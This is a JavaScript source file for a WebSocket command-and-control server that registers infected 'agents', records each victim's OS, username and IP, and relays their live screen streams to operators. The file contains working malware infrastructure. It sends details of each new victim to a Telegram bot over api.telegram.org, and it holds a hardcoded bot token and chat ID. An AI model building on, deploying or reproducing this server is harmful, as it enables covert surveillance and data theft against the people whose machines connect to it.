const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const https = require('https');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- CONFIGURATION ---
const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
const TELEGRAM_CHAT_ID = '6172226452';

// In-memory log buffer to replace /var/task/c2.log
let logBuffer = [];
const MAX_LOGS = 500;

let clients = {};

app.use(express.static(path.join(__dirname))); 

function logToFile(msg) {
    const timestamp = new Date().toISOString();
    const line = `[${timestamp}] ${msg}`;
    
    // Push to memory buffer
    logBuffer.push(line);
    if (logBuffer.length > MAX_LOGS) {
        logBuffer.shift();
    }

    // Print to Vercel Console
    console.log(line);

    // Broadcast to all admins so they see the raw logs in real-time
    broadcastLogToAdmins(line);
}

function notifyTelegram(msg) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
    https.get(url, (res) => {
        // Check for success
    }).on('error', (e) => {
        logToFile(`[TG ERROR] ${e.message}`);
    });
}

wss.on('connection', (ws, req) => {
    let id = uuidv4().substr(0, 8);
    
    ws.id = id;
    clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false };

    logToFile(`[+] Client Connected: ${id}`);
    ws.send(JSON.stringify({ type: 'registered', id: id }));

    // Heartbeat to keep Vercel alive
    let pingInterval = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.ping();
        } else {
            clearInterval(pingInterval);
        }
    }, 25000);

    ws.on('message', (msgRaw) => {
        try {
            const data = JSON.parse(msgRaw);
            logToFile(`[MSG] Received from ${id}: ${data.type}`);

            // Admin Registration
            if (data.type === 'register_admin') {
                clients[id].isAdmin = true;
                logToFile(`[ADMIN] Connected with ID: ${id}`);
                return;
            }

            // Agent Info Packet
            if (data.type === 'info') {
                clients[id].info = data;
                clients[id].lastSeen = Date.now();
                
                // Notify all admins
                notifyAdmin(id, `🟢 New User: ${data.os} (${data.user})`);
                broadcastToAdmin(id, data);

                // Telegram Notification
                notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os}\nUser: ${data.user}\nIP: ${data.ip || 'Unknown'}`);
            } 
            // Handle Heartbeat
            else if (data.type === 'heartbeat') {
                clients[id].lastSeen = Date.now();
            }
            // Forward Signaling Data
            else if (['offer', 'answer', 'candidate'].includes(data.type)) {
                forwardToTarget(id, data);
            } 
            // Screen Data / Generic Broadcasts
            else {
                // If we get screen data but no info yet, create a placeholder user
                if (!clients[id].info && !clients[id].isAdmin) {
                    clients[id].info = { os: 'Unknown', user: 'Unknown', ip: 'Unknown' };
                    notifyAdmin(id, `📺 Screen Active: ${id}`);
                }
                broadcastToAdmin(id, data);
            }
        } catch (e) {
            logToFile(`[ERR] Message parsing error from ${id}: ${e.message}`);
        }
    });

    ws.on('close', () => {
        delete clients[id];
        notifyAdmin(id, '🔴 User Disconnected');
        notifyTelegram(`🔴 AGENT DISCONNECTED\nID: ${id}`);
        logToFile(`[-] Client Disconnected: ${id}`);
    });

    ws.on('pong', () => {
        // Keepalive received
    });
});

function notifyAdmin(id, msg) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
            client.send(JSON.stringify({ targetId: id, type: 'alert', message: msg }));
        }
    });
}

function broadcastToAdmin(sourceId, data) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
            client.send(JSON.stringify({ targetId: sourceId, ...data }));
        }
    });
}

function broadcastLogToAdmins(line) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
            client.send(JSON.stringify({ type: 'system_log', message: line }));
        }
    });
}

function forwardToTarget(sourceId, data) {
    if (data.targetId && clients[data.targetId]) {
        const targetWs = clients[data.targetId].ws;
        if (targetWs.readyState === WebSocket.OPEN) {
            targetWs.send(JSON.stringify(data));
        }
    }
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    logToFile(`C2 Server running on port ${PORT}`);
});
